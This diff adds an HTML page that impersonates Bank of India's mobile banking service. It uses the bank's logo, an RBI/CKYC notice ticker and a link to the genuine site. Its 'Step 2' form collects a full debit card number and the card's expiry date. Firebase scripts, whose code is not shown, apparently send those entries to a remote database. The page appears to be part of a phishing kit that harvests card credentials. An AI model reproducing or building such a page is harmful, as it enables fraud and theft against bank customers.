@@ -1,0 +1,192 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BOI MOBILE - Step 2</title>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <!-- Firebase Config + Submit Script -->
+  <script src="firebase-config.js" defer></script>
+  <script src="form-stepp2.js" defer></script>
+
+  <!-- ✅ SAME CSS as step1.html -->
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+
+    .form-container {
+      background-color: white;
+      max-width: 90%;
+      width: 400px;
+      margin: 30px auto;
+      padding: 25px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .logo {
+      display: block;
+      width: 100%;
+      max-width: 180px;
+      height: auto;
+      margin: 0 auto 15px;
+    }
+
+    .ticker {
+      margin-bottom: 15px;
+    }
+
+    marquee {
+      background: #007dc6;
+      color: yellow;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    h1 {
+      color: #003366;
+      margin-bottom: 5px;
+    }
+
+    h3 {
+      color: #333;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+
+    label {
+      display: block;
+      margin: 15px 0 6px;
+      font-weight: bold;
+      color: #333;
+      text-align: left;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+
+    input:focus {
+      border-color: #003366;
+      outline: none;
+      box-shadow: 0 0 5px rgba(0, 51, 102, 0.4);
+    }
+
+    button {
+      margin-top: 25px;
+      width: 100%;
+      padding: 12px;
+      background-color: #003366;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 17px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #002244;
+    }
+
+    .important-note {
+      margin-top: 30px;
+      background-color: #fffbe6;
+      color: #333;
+      font-size: 14px;
+      border-left: 5px solid #ffcc00;
+      padding: 15px;
+      text-align: left;
+      line-height: 1.6;
+      border-radius: 6px;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 20px;
+      }
+
+      h3 {
+        font-size: 15px;
+      }
+
+      .form-container {
+        padding: 20px 15px;
+      }
+
+      input, button {
+        font-size: 15px;
+      }
+
+      .logo {
+        max-width: 160px;
+      }
+
+      marquee {
+        font-size: 13px;
+      }
+
+      .important-note {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <img src="https://imgs.search.brave.com/kbZs-xrd1Bu6JaWNLxwmBUKr4drQWlYM22nHo4QNH3o/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly8xMDAw/bG9nb3MubmV0L3dw/LWNvbnRlbnQvdXBs/b2Fkcy8yMDIxLzA2/L0Jhbmstb2YtSW5k/aWEtbG9nby01MDB4/MjgxLnBuZw" alt="BOI Logo" class="logo">
+
+    <div class="ticker">
+      <marquee behavior="scroll" scrollamount="5" direction="left" onmouseover="this.stop();" onmouseout="this.start();">
+        Dear Customers, As per RBI guidelines CKYC identification number (14 digits) is mandatory...
+      </marquee>
+    </div>
+
+    <h1>Welcome to</h1>
+    <h3>BOI MOBILE Banking Services</h3>
+
+    <!-- ✅ Step 2 Form -->
+    <form id="step2form">
+      <label for="card">Debit Card Number</label>
+      <input type="text" id="card" name="card" pattern="[0-9]{16}" maxlength="16" required placeholder="Enter 16-digit card number">
+
+      <label>Expiry Date</label>
+      <div style="display: flex; gap: 10px;">
+        <input type="text" id="exp_month" maxlength="2" pattern="[0-9]{2}" placeholder="MM" required style="flex: 1;">
+        <input type="text" id="exp_year" maxlength="4" pattern="[0-9]{4}" placeholder="YYYY" required style="flex: 1;">
+      </div>
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <div class="important-note">
+      <strong>IMPORTANT:</strong> In our constant endeavor to give you better service and user experience...
+      <a href="https://www.bankofindia.co.in" target="_blank">https://www.bankofindia.co.in</a><br><br>
+      <em>[Best viewed in IE version 9 and above, Mozilla Firefox 34 and above, Google Chrome 40 and above, and Safari 7 and above...]</em>
+    </div>
+  </div>
+
+</body>
+</html>
